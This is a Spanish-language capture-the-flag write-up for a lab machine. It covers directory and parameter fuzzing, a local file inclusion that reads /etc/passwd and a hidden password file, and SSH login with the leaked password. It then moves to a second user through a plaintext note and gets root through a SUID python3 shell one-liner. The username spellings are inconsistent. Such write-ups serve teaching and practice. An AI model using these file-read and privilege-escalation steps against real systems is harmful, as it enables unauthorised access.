## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

La web es un index.html de Apache normal, decido hacerle fuzzing de directorios:

```bash
gobuster dir -u http://172.17.0.2/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro index.php y veo esto:

```bash
Bienvenido al servidor CTF Patriaquerida.¡No olvides revisar el archivo oculto en /var/www/html/.hidden_pass!
```

Decido hacerle fuzz de parámetros:

```bash
ffuf -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/big.txt -fs 110
```

Encuentro el parámetro “page”.

Leyendo el archivo que nos daba la primera web:

```bash
http://172.17.0.2/index.php?page=/var/www/html/.hidden_pass
```

Solo hay una palabra : 

```bash
balu
```

Veo los usuarios del servidor:

```bash
http://172.17.0.2/index.php?page=/etc/passwd
```

Encuentro mario y pingüino. 

Pruebo “balu” como contraseña en SSH para los dos usuarios y funciona para el usuario pinguino.

## Escalada pinguino → mario

En el directorio /home/pinguno hay una nota:

```bash
ls -la /home/penguino
# Info:
La contraseña de mario es: invitaacachopo
```

## Escalada mario → root

Listo los permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encuentro python3.

Gracias GTFO bins:

```bash
python3.8 -c 'import os; os.execl("/bin/bash", "sh", "-p")'
```

Listo.
